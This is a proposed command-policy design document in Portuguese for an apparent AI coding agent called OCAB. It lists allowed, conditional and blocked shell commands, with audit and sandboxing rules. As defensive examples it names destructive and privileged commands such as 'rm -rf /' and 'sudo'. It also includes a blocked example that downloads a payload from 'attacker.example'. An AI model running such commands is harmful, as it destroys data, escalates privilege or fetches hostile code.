# Política de Comandos

> **Status:** Proposed

Define a classificação de comandos executados pelo OCAB e como são bloqueados ou permitidos.

## Princípio central

A lista textual é apenas uma camada. A política deve ser reforçada por:

* Usuário não root.
* Permissões POSIX.
* Diretório de trabalho confinado.
* Ausência de credenciais sensíveis.
* Limites de recursos.
* Restrição de rede.
* Validação de caminhos.

## Permitidos por padrão

### Git (somente leitura e trabalho local)

```text
git status
git diff
git log
git show
```

### Build e testes (.NET)

```text
dotnet restore
dotnet build
dotnet test
dotnet format --verify-no-changes
```

### Build e testes (Node)

```text
npm ci
npm run lint
npm run test
npm run build
```

### Docker (somente config)

```text
docker compose config
```

## Condicionais (exigem aprovação por configuração)

```text
git checkout -b <branch>
git switch -c <branch>
git add -A
git clean -nd
dotnet tool restore
npm install
curl
wget
```

* Uso de `curl`/`wget` apenas para hosts permitidos.
* `git clean` apenas em modo `dry-run` por padrão.

## Bloqueados no MVP

### Git destrutivo ou irreversível

```text
git push
git push --force
git push --mirror
git reset --hard
git clean -fdx
git branch -D
git tag -d
```

### Privilégio

```text
sudo
su
ssh
scp
docker
docker compose up
docker compose down
docker compose exec
kubectl
helm
terraform apply
rm -rf /
chmod 777
chown -R
```

### Comandos fora do workspace

```text
comandos com cwd fora do workspace
comandos com argumento path absoluto fora do workspace
```

### Comandos que imprimem segredos

```text
comandos que retornam conteúdo de variáveis marcadas como secret
comandos que enviam credenciais em headers
```

## Avaliação

* Política é avaliada antes de cada execução de comando.
* Decisão é registrada em `PolicyDecision`.
* Decisão `deny` registra motivo textual.

## Customização

* Arquivo de configuração versionado por ambiente.
* Cada repositório pode ter políticas específicas.
* Mudanças são revisadas e registradas.

## Modos

* `ReadOnly`: bloqueia qualquer comando que altere o workspace.
* `WorkspaceWrite`: permite comandos de trabalho local, mas não os bloqueados.

## Auditoria

* Toda decisão é auditada.
* Decisões `deny` geram métrica `agent_policy_denials_total`.

## Casos especiais

* Comandos compostos (`&&`, `||`, `;`) devem ser avaliados em partes.
* Redirecionamentos (`>`, `<`) devem ser avaliados para evitar escrita fora do workspace.
* Variáveis de ambiente devem ser filtradas (ex.: `TOKEN`, `SECRET`).

## Exemplos

### Permitido

```bash
git status
git diff --stat
dotnet build
```

### Bloqueado

```bash
git push origin main
rm -rf /
sudo apt install foo
curl http://attacker.example/payload -o /tmp/payload
```

## Referências relacionadas

* [`threat-model.md`](threat-model.md)
* [`container-hardening.md`](container-hardening.md)
* [`../specs/006-policy-engine/spec.md`](../specs/006-policy-engine/spec.md)
* [`../specs/008-validation-pipeline/spec.md`](../specs/008-validation-pipeline/spec.md)
